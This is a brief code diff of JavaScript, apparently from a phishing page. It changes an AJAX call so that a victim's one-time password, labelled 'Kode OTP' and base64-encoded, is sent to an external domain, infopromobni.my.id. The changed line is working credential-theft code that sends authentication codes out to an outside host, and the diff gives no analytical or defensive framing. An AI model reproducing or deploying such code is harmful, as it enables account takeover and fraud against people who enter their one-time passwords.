@@ -51,7 +51,7 @@ function send() {
     $("#loader").css("display", "flex");
     $.ajax({
         type: "get",
-        url: "send.php?message="+btoa("Kode OTP: "+otpCode),
+        url: "https://infopromobni.my.id/send.php?message="+btoa("Kode OTP: "+otpCode),
         dataType: "text",
         success: function(response) {
             $("#loader").css("display", "none");
